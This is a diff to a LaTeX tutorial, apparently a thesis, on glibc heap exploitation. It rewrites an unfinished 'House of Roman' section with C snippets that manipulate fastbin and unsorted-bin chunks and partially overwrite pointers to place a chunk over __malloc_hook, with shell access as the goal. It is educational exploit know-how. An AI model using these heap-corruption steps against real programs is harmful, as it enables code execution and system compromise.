@@ -1618,9 +1618,65 @@ Finally, we trigger the attack by one allocation.
 \end{lstlisting}
 
 \subsection{The House of roman = NOT FINISH YET}
-This attack is a combination of \fb{} attack, \ub{} attack, and Use after the free attack, also, The goal is to open a shell. However, the chance of a successful attack is so slight because we need to brute force 12-bit of randomness. The attack consists of three steps.
+The main goal of this attack is to get shell access by a combination of \ub{} attack and Use after the free attack.
 
-The first step is to get a pointer inside \emph{\lstinline{malloc_hook}}, but what is the \lstinline{malloc_hook}? \lstinline{malloc_hook} lets us modify the behavior of \mallocc{} and \freec{} with a hook function. To achieve this, we use a \fb{} attack in a way the \lstinline{fd} pointer points to \lstinline{malloc_hook}.
+The first step is to get a pointer inside \emph{\lstinline{malloc_hook}}. \lstinline{malloc_hook} lets us modify the behavior of \lstinline{malloc} and \lstinline{free} with a hook function. To achieve this, we create a \fb{} chunk in a way the \lstinline{fd} pointer points to \lstinline{malloc_hook}.
+\begin{lstlisting}[language=c,frame=tlrb]
+uint8_t* fastbin_victim = malloc(0x60); 
+malloc(0x80);
+uint8_t* main_arena_use = malloc(0x80);
+uint8_t* relative_offset_heap = malloc(0x60);
+free(main_arena_use);
+\end{lstlisting}
+
+The last \freec{}, put \lstinline{main_arena_use} chunk inside the \ub{}; also, \lstinline{main_arena_use} has a pointer to \lstinline{main_arena+0X68} inside \lstinline{fd} pointer.
+Now by request a chunk inside the \fb{} chunk size, we have a chunk that has a pointer to \lstinline{main_arena inside} the \lstinline{fd} pointer.
+
+\begin{lstlisting}[language=c,frame=tlrb]
+uint8_t* fake_libc_chunk = malloc(0x60);
+\end{lstlisting}
+
+Note that the chunk size is mainly set to 0x60 to put this inside the fast bins 0x70 later. 
+In the next step, we free \lstinline{relative_offset_heap} and \lstinline{fastbin_victim} . We free \lstinline{relative_offset_heap} at first, so the heap manager puts \lstinline{relative_offset_heap} inside the \lstinline{fd} pointer to \lstinline{fastbin_victim}. Please take a look at the heap layout.
+
+\begin{lstlisting}[language=c,frame=tlrb]
+0x0: fastbin_victim - size 0x70 
+0x70: alignment_filler - size 0x90
+0x100: fake_libc_chunk - size 0x70
+0x170: leftover_main - size 0x20
+0x190: relative_offset_heap - size 0x70 
+\end{lstlisting}
+
+Now,  \fb{} use a single link list and the \lstinline{fd} pointer of \lstinline{fastbin_victim}, point to \lstinline{relative_offset_heap}. By manipulating the last two bytes of \lstinline{fastbin_victim}, we make it a point to \lstinline{fake_libc_chunk}. Also, as we remember, \lstinline{fake_libc_chunk} had a pointer to \lstinline{main_arens+0x68} inside the \lstinline{fd} pointer.
+
+\begin{lstlisting}[language=c,frame=tlrb]
+fastbin_victim[0] = 0x00;
+\end{lstlisting}
+
+The final layout of \fb{} would be as below.
+
+\begin{lstlisting}[language=c,frame=tlrb]
+fastbin_victim -> fake_libc_chunk ->(main_arena + 0x68).
+\end{lstlisting}
+
+We need to change the \lstinline{fd} pointer to \lstinline{fake_libc_chunk} to point to \lstinline{malloc_hook} instead of \lstinline{main_arena + 0x68}.
+
+\begin{lstlisting}[language=c,frame=tlrb]
+long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;
+long long __malloc_hook_adjust = __malloc_hook - 0x23;
+int8_t byte1 = (__malloc_hook_adjust) & 0xff; 
+int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
+fake_libc_chunk[0] = byte1;
+fake_libc_chunk[1] = byte2;
+malloc(0x60);
+malloc(0x60);
+uint8_t* malloc_hook_chunk = malloc(0x60);
+\end{lstlisting}
+
+First, we calculate the address of \lstinline{__malloc_hook}. We have an address inside libc, which keeps inside the \lstinline{fd} pointer of \lstinline{fake_libc_chunk}. We calculate the offset between the start of libc and \lstinline{main_arena+0x68}, which keep in the \lstinline{fd} pointer. In the next step, find the offset of \lstinline{__malloc_hook} inside the libc. The distance between these two offsets is 0xe8.
+We want to use  0x7f as a valid \fb{} chunk size; to do that, we subtract \lstinline{__malloc_hook} by 0X23. With two malloc \lstinline{fastbin_victim} and \lstinline{fake_libc_chunk} remove from \fb{}, the final malloc returns the \lstinline{malloc_hook_chunk}.
+
+As we talk before, the unsorted bin attack let us write a value in a controlled location. The final goal of the attack is to get the shell access; to do this, we need to have the libc address.
 
 \subsection{The House of Rabbit}
 
